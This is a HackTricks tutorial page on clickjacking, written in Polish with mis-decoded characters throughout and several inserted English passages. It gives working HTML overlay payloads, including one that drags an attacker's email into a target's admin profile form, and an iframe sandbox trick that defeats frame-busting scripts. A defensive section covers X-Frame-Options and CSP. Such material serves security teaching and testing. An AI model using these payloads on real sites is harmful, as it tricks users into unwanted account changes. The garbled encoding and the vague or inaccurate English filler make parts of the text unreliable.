# Clickjacking

<details>

<summary><strong>Naucz siÄ™ hakowaÄ‡ AWS od zera do bohatera z</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Inne sposoby wsparcia HackTricks:

* JeÅ›li chcesz zobaczyÄ‡ swojÄ… **firmÄ™ reklamowanÄ… w HackTricks** lub **pobraÄ‡ HackTricks w formacie PDF**, sprawdÅº [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)!
* ZdobÄ…dÅº [**oficjalne gadÅ¼ety PEASS & HackTricks**](https://peass.creator-spring.com)
* Odkryj [**RodzinÄ™ PEASS**](https://opensea.io/collection/the-peass-family), naszÄ… kolekcjÄ™ ekskluzywnych [**NFT**](https://opensea.io/collection/the-peass-family)
* **DoÅ‚Ä…cz do** ğŸ’¬ [**grupy Discord**](https://discord.gg/hRep4RUj7f) lub [**grupy telegramowej**](https://t.me/peass) lub **Å›ledÅº** nas na **Twitterze** ğŸ¦ [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Podziel siÄ™ swoimi sztuczkami hakerskimi, przesyÅ‚ajÄ…c PR-y do** [**HackTricks**](https://github.com/carlospolop/hacktricks) i [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>

<figure><img src="../.gitbook/assets/image (3) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

\
UÅ¼yj [**Trickest**](https://trickest.com/?utm\_campaign=hacktrics\&utm\_medium=banner\&utm\_source=hacktricks), aby Å‚atwo tworzyÄ‡ i **automatyzowaÄ‡ przepÅ‚ywy pracy** przy uÅ¼yciu najbardziej zaawansowanych narzÄ™dzi spoÅ‚ecznoÅ›ciowych na Å›wiecie.\
Otrzymaj dostÄ™p juÅ¼ dziÅ›:

{% embed url="https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks" %}

## Czym jest Clickjacking

W ataku clickjacking, **uÅ¼ytkownik** zostaje **oszukany**, aby **kliknÄ…Ä‡** na **element** na stronie internetowej, ktÃ³ry jest albo **niewidoczny**, albo udaje inny element. Ta manipulacja moÅ¼e prowadziÄ‡ do niezamierzonych konsekwencji dla uÅ¼ytkownika, takich jak pobieranie zÅ‚oÅ›liwego oprogramowania, przekierowanie na zÅ‚oÅ›liwe strony internetowe, udostÄ™pnianie poÅ›wiadczeÅ„ dostÄ™pu lub poufnych informacji, transfer pieniÄ™dzy lub zakup produktÃ³w online.


### Trik z wypeÅ‚nianiem formularzy

Czasami moÅ¼liwe jest **wypeÅ‚nienie wartoÅ›ci pÃ³l formularza za pomocÄ… parametrÃ³w GET podczas Å‚adowania strony**. AtakujÄ…cy moÅ¼e wykorzystaÄ‡ to zachowanie, aby wypeÅ‚niÄ‡ formularz dowolnymi danymi i wysÅ‚aÄ‡ payload clickjacking, aby uÅ¼ytkownik nacisnÄ…Å‚ przycisk WyÅ›lij.

### WypeÅ‚nij formularz za pomocÄ… przeciÄ…gnij i upuÅ›Ä‡

JeÅ›li potrzebujesz, aby uÅ¼ytkownik **wypeÅ‚niÅ‚ formularz**, ale nie chcesz bezpoÅ›rednio prosiÄ‡ go o wpisanie okreÅ›lonych informacji (takich jak adres e-mail i/lub hasÅ‚o, ktÃ³rych znasz), moÅ¼esz poprosiÄ‡ go tylko o **przeciÄ…gniÄ™cie i upuszczenie** czegoÅ›, co wpisze Twoje kontrolowane dane, jak w [**tym przykÅ‚adzie**](https://lutfumertceylan.com.tr/posts/clickjacking-acc-takeover-drag-drop/).

### Podstawowy Payload
```markup
<style>
iframe {
position:relative;
width: 500px;
height: 700px;
opacity: 0.1;
z-index: 2;
}
div {
position:absolute;
top:470px;
left:60px;
z-index: 1;
}
</style>
<div>Click me</div>
<iframe src="https://vulnerable.com/email?email=asd@asd.asd"></iframe>
```
### Wieloetapowy Payload

To execute a successful clickjacking attack, you can use a multistep payload. This involves dividing the attack into multiple steps to bypass certain security measures.

A typical multistep payload consists of the following steps:

1. **Step 1: Load the target page**: The attacker loads the target page within an iframe on their own malicious website.

2. **Step 2: Overlay an invisible element**: The attacker overlays an invisible element, such as a button or a link, on top of the target page. This element will be used to capture the user's click.

3. **Step 3: Trick the user into clicking**: The attacker employs various techniques to trick the user into clicking on the invisible element. This can include disguising the element as a legitimate button or link, or using social engineering techniques to manipulate the user's behavior.

4. **Step 4: Perform the malicious action**: Once the user clicks on the invisible element, the attacker can perform the desired malicious action. This can include submitting a form, making a purchase, or executing any other action that the user unwittingly initiated.

By using a multistep payload, the attacker can increase the chances of a successful clickjacking attack by bypassing security measures that may be in place to detect and prevent single-step attacks.
```markup
<style>
iframe {
position:relative;
width: 500px;
height: 500px;
opacity: 0.1;
z-index: 2;
}
.firstClick, .secondClick {
position:absolute;
top:330px;
left:60px;
z-index: 1;
}
.secondClick {
left:210px;
}
</style>
<div class="firstClick">Click me first</div>
<div class="secondClick">Click me next</div>
<iframe src="https://vulnerable.net/account"></iframe>
```
### PrzeciÄ…gnij i upuÅ›Ä‡ + kliknij payload

This technique combines the use of drag and drop functionality with a click event to execute a payload. It takes advantage of the fact that certain elements on a webpage can be dragged and dropped, and that a click event can be triggered when the element is dropped.

To perform a drag and drop + click attack, the attacker first needs to identify a draggable element on the target webpage. This can be done by inspecting the webpage's source code or using browser developer tools.

Once the draggable element is identified, the attacker can create a payload that will be executed when the element is dropped. The payload can be a malicious script or a URL that redirects the user to a malicious website.

To execute the attack, the attacker needs to trick the victim into dragging and dropping the element. This can be done by overlaying the draggable element with an invisible or transparent element that the victim is likely to click on. When the victim clicks on the overlay element, they unknowingly trigger the drag and drop event, which in turn triggers the click event and executes the payload.

This technique can be used to perform various types of attacks, such as stealing sensitive information, performing actions on behalf of the victim, or redirecting the victim to a malicious website.

To protect against drag and drop + click attacks, web developers should validate and sanitize user input, implement click event handlers that prevent unauthorized execution of payloads, and educate users about the risks of interacting with draggable elements on untrusted websites.
```markup
<html>
<head>
<style>
#payload{
position: absolute;
top: 20px;
}
iframe{
width: 1000px;
height: 675px;
border: none;
}
.xss{
position: fixed;
background: #F00;
}
</style>
</head>
<body>
<div style="height: 26px;width: 250px;left: 41.5%;top: 340px;" class="xss">.</div>
<div style="height: 26px;width: 50px;left: 32%;top: 327px;background: #F8F;" class="xss">1. Click and press delete button</div>
<div style="height: 30px;width: 50px;left: 60%;bottom: 40px;background: #F5F;" class="xss">3.Click me</div>
<iframe sandbox="allow-modals allow-popups allow-forms allow-same-origin allow-scripts" style="opacity:0.3"src="https://target.com/panel/administration/profile/"></iframe>
<div id="payload" draggable="true" ondragstart="event.dataTransfer.setData('text/plain', 'attacker@gmail.com')"><h3>2.DRAG ME TO THE RED BOX</h3></div>
</body>
</html>
```
### XSS + Clickjacking

JeÅ›li zidentyfikowano **atak XSS, ktÃ³ry wymaga od uÅ¼ytkownika klikniÄ™cia** w pewien element, a strona jest **podatna na clickjacking**, moÅ¼na go wykorzystaÄ‡, aby oszukaÄ‡ uÅ¼ytkownika i zmusiÄ‡ go do klikniÄ™cia przycisku/linku.\
PrzykÅ‚ad:\
_ZnalazÅ‚eÅ› **self XSS** w prywatnych danych konta (dane, ktÃ³re **tylko ty moÅ¼esz ustawiÄ‡ i odczytaÄ‡**). Strona z **formularzem** do ustawiania tych danych jest **podatna** na **clickjacking**, i moÅ¼esz **wypeÅ‚niÄ‡** formularz za pomocÄ… parametrÃ³w GET._\
\_\_AtakujÄ…cy moÅ¼e przygotowaÄ‡ atak **clickjacking** na tÄ™ stronÄ™, **wypeÅ‚niajÄ…c** formularz **XSS payloadem** i **oszukujÄ…c** uÅ¼ytkownika, aby **przesÅ‚aÅ‚** formularz. Gdy formularz zostanie przesÅ‚any i wartoÅ›ci zostanÄ… zmodyfikowane, **uÅ¼ytkownik uruchomi XSS**.

## Strategie Å‚agodzenia Clickjacking

### Obrona po stronie klienta

Skrypty wykonane po stronie klienta mogÄ… podejmowaÄ‡ dziaÅ‚ania w celu zapobiegania Clickjackingowi:

* Upewnienie siÄ™, Å¼e okno aplikacji jest gÅ‚Ã³wne lub najwyÅ¼sze.
* Uczynienie wszystkich ramek widocznymi.
* Zapobieganie klikaniu w niewidoczne ramki.
* Wykrywanie i informowanie uÅ¼ytkownikÃ³w o potencjalnych prÃ³bach Clickjackingu.

Jednak te skrypty Å‚amiÄ…ce ramki mogÄ… byÄ‡ obejÅ›czone:

* **Ustawienia bezpieczeÅ„stwa przeglÄ…darek:** NiektÃ³re przeglÄ…darki mogÄ… blokowaÄ‡ te skrypty na podstawie swoich ustawieÅ„ bezpieczeÅ„stwa lub braku obsÅ‚ugi JavaScript.
* **Atrybut HTML5 iframe `sandbox`:** AtakujÄ…cy moÅ¼e zneutralizowaÄ‡ skrypty Å‚amiÄ…ce ramki, ustawiajÄ…c atrybut `sandbox` z wartoÅ›ciami `allow-forms` lub `allow-scripts`, bez `allow-top-navigation`. Zapobiega to sprawdzaniu przez iframe, czy jest to najwyÅ¼sze okno, np.
```html
<iframe id="victim_website" src="https://victim-website.com" sandbox="allow-forms allow-scripts"></iframe>
```
WartoÅ›ci `allow-forms` i `allow-scripts` umoÅ¼liwiajÄ… dziaÅ‚ania w ramce, jednoczeÅ›nie wyÅ‚Ä…czajÄ…c nawigacjÄ™ na najwyÅ¼szym poziomie. Aby zapewniÄ‡ zamierzonÄ… funkcjonalnoÅ›Ä‡ docelowej strony, mogÄ… byÄ‡ konieczne dodatkowe uprawnienia, takie jak `allow-same-origin` i `allow-modals`, w zaleÅ¼noÅ›ci od rodzaju ataku. Komunikaty konsoli przeglÄ…darki mogÄ… wskazywaÄ‡, jakie uprawnienia naleÅ¼y zezwoliÄ‡.

### Obrona po stronie serwera

#### NagÅ‚Ã³wek odpowiedzi HTTP `X-Frame-Options`

NagÅ‚Ã³wek odpowiedzi HTTP **`X-Frame-Options`** informuje przeglÄ…darki o legalnoÅ›ci renderowania strony w elemencie `<frame>` lub `<iframe>`, pomagajÄ…c w zapobieganiu Clickjackingowi:

* `X-Frame-Options: deny` - Å»adna domena nie moÅ¼e osadzaÄ‡ zawartoÅ›ci.
* `X-Frame-Options: sameorigin` - Tylko bieÅ¼Ä…ca witryna moÅ¼e osadzaÄ‡ zawartoÅ›Ä‡.
* `X-Frame-Options: allow-from https://trusted.com` - Tylko okreÅ›lony adres 'uri' moÅ¼e osadzaÄ‡ stronÄ™.
* NaleÅ¼y zauwaÅ¼yÄ‡ ograniczenia: jeÅ›li przeglÄ…darka nie obsÅ‚uguje tej dyrektywy, moÅ¼e nie dziaÅ‚aÄ‡. NiektÃ³re przeglÄ…darki preferujÄ… dyrektywÄ™ CSP frame-ancestors.

#### Dyrektywa `frame-ancestors` w polityce bezpieczeÅ„stwa zawartoÅ›ci (CSP)

**Dyrektywa `frame-ancestors` w CSP** jest zalecanÄ… metodÄ… ochrony przed Clickjackingiem:

* `frame-ancestors 'none'` - Podobne do `X-Frame-Options: deny`.
* `frame-ancestors 'self'` - Podobne do `X-Frame-Options: sameorigin`.
* `frame-ancestors trusted.com` - Podobne do `X-Frame-Options: allow-from`.

Na przykÅ‚ad, poniÅ¼sza polityka CSP pozwala tylko na osadzanie z tej samej domeny:

`Content-Security-Policy: frame-ancestors 'self';`

SzczegÃ³Å‚owe informacje i przykÅ‚adowe zÅ‚oÅ¼one przypadki moÅ¼na znaleÅºÄ‡ w [dokumentacji CSP dotyczÄ…cej dyrektywy frame-ancestors](https://w3c.github.io/webappsec-csp/document/#directive-frame-ancestors) oraz w [dokumentacji CSP frame-ancestors Mozilli](https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Content-Security-Policy/frame-ancestors).

### Polityka bezpieczeÅ„stwa zawartoÅ›ci (CSP) z `child-src` i `frame-src`

**Polityka bezpieczeÅ„stwa zawartoÅ›ci (CSP)** to Å›rodek bezpieczeÅ„stwa, ktÃ³ry pomaga w zapobieganiu Clickjackingowi i innym atakom polegajÄ…cym na wstrzykiwaniu kodu, okreÅ›lajÄ…c, ktÃ³re ÅºrÃ³dÅ‚a przeglÄ…darka powinna zezwoliÄ‡ na Å‚adowanie zawartoÅ›ci.

#### Dyrektywa `frame-src`
- OkreÅ›la prawidÅ‚owe ÅºrÃ³dÅ‚a dla ramek.
- Bardziej szczegÃ³Å‚owa niÅ¼ dyrektywa `default-src`.
```
Content-Security-Policy: frame-src 'self' https://trusted-website.com;
```
Ta polityka umoÅ¼liwia ramki z tego samego ÅºrÃ³dÅ‚a (self) oraz https://trusted-website.com.

#### Dyrektywa `child-src`
- Wprowadzona w CSP poziomu 2, aby ustawiÄ‡ prawidÅ‚owe ÅºrÃ³dÅ‚a dla pracownikÃ³w sieciowych i ramek.
- DziaÅ‚a jako fallback dla dyrektyw frame-src i worker-src.
```
Content-Security-Policy: child-src 'self' https://trusted-website.com;
```
Ta polityka pozwala na ramki i workery z tego samego ÅºrÃ³dÅ‚a (self) oraz https://trusted-website.com.

**Uwagi dotyczÄ…ce uÅ¼ycia:**
- Wycofywanie: child-src jest stopniowo zastÄ™powane przez frame-src i worker-src.
- Zachowanie awaryjne: JeÅ›li frame-src jest nieobecne, child-src jest uÅ¼ywane jako awaryjne dla ramek. JeÅ›li oba sÄ… nieobecne, uÅ¼ywane jest default-src.
- ÅšcisÅ‚e okreÅ›lenie ÅºrÃ³dÅ‚a: W dyrektywach naleÅ¼y uwzglÄ™dniÄ‡ tylko zaufane ÅºrÃ³dÅ‚a, aby zapobiec wykorzystaniu.

#### Skrypty JavaScript Å‚amiÄ…ce ramki

ChoÄ‡ nie sÄ… one caÅ‚kowicie niezawodne, skrypty oparte na JavaScript mogÄ… byÄ‡ uÅ¼ywane do uniemoÅ¼liwienia osadzania strony internetowej w ramce. PrzykÅ‚ad:
```javascript
if (top !== self) {
top.location = self.location;
}
```
#### Wykorzystanie tokenÃ³w Anti-CSRF

* **Walidacja tokenÃ³w:** W aplikacjach internetowych uÅ¼ywaj tokenÃ³w Anti-CSRF, aby upewniÄ‡ siÄ™, Å¼e Å¼Ä…dania zmieniajÄ…ce stan sÄ… wykonywane celowo przez uÅ¼ytkownika, a nie przez stronÄ™ Clickjacked.

## Referencje

* [**https://portswigger.net/web-security/clickjacking**](https://portswigger.net/web-security/clickjacking)
* [**https://cheatsheetseries.owasp.org/cheatsheets/Clickjacking\_Defense\_Cheat\_Sheet.html**](https://cheatsheetseries.owasp.org/cheatsheets/Clickjacking\_Defense\_Cheat\_Sheet.html)

<figure><img src="../.gitbook/assets/image (3) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

\
UÅ¼yj [**Trickest**](https://trickest.com/?utm\_campaign=hacktrics\&utm\_medium=banner\&utm\_source=hacktricks), aby Å‚atwo tworzyÄ‡ i **automatyzowaÄ‡ zadania** przy uÅ¼yciu najbardziej zaawansowanych narzÄ™dzi spoÅ‚ecznoÅ›ciowych na Å›wiecie.\
ZdobÄ…dÅº dostÄ™p juÅ¼ dziÅ›:

{% embed url="https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks" %}

<details>

<summary><strong>Naucz siÄ™ hakowaÄ‡ AWS od zera do bohatera z</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Inne sposoby wsparcia HackTricks:

* JeÅ›li chcesz zobaczyÄ‡ swojÄ… **firmÄ™ reklamowanÄ… w HackTricks** lub **pobraÄ‡ HackTricks w formacie PDF**, sprawdÅº [**PLAN SUBSKRYPCJI**](https://github.com/sponsors/carlospolop)!
* ZdobÄ…dÅº [**oficjalne gadÅ¼ety PEASS & HackTricks**](https://peass.creator-spring.com)
* Odkryj [**RodzinÄ™ PEASS**](https://opensea.io/collection/the-peass-family), naszÄ… kolekcjÄ™ ekskluzywnych [**NFT**](https://opensea.io/collection/the-peass-family)
* **DoÅ‚Ä…cz do** ğŸ’¬ [**grupy Discord**](https://discord.gg/hRep4RUj7f) lub [**grupy telegramowej**](https://t.me/peass) lub **Å›ledÅº** nas na **Twitterze** ğŸ¦ [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Podziel siÄ™ swoimi trikami hakerskimi, przesyÅ‚ajÄ…c PR-y do** [**HackTricks**](https://github.com/carlospolop/hacktricks) i [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
